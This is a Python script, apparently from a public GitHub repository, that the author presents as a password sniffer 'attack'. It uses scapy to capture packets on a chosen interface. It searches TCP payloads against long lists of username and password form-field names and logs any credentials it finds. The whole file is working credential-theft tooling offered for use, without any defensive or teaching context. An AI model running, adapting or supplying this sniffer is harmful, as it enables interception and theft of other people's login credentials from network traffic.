#!/usr/bin/env python3

# Read README.md
# A password sniffer made Python 3.10.2. 
# Made by Anz
# Github: https://github.com/Anz1x

from scapy.all import *
from urllib import parse
import re
import logging
import colorama
from colorama import Fore

colorama.init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="\033[38;5;21m[\033[0m%(asctime)s.%(msecs)03d\033[38;5;21m] \033[0m%(message)s\033[0m", 
    datefmt="%H:%M:%S")

logging.info(Fore.YELLOW + "Starting the Password Sniffer attack\n")

def credentials(body):

    username = None
    password = None

    userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

    for user in userfields:
        user_re = re.search('(%s=[^&]+)' % user, body, re.IGNORECASE)
        if user_re:
            username = user_re.group()
            
    for passfield in passfields:
        password_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if password_re:
            password = password_re.group() 

    if username and password:
        return(username, password)

def packet_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        username_password = credentials(body)
        if username_password != None:
            logging.info(packet[TCP].payload)
            logging.info(parse.unquote(Fore.GREEN + username_password[0]))
            logging.info(parse.unquote(Fore.GREEN + username_password[1]))
    else:
        pass

iface = str(sys.argv[1])

try:
    sniff(iface=iface, prn=packet_parser, store=0)
except KeyboardInterrupt:
    logging.info(Fore.RED + "\n[+] Exited the session")
 
    exit(0)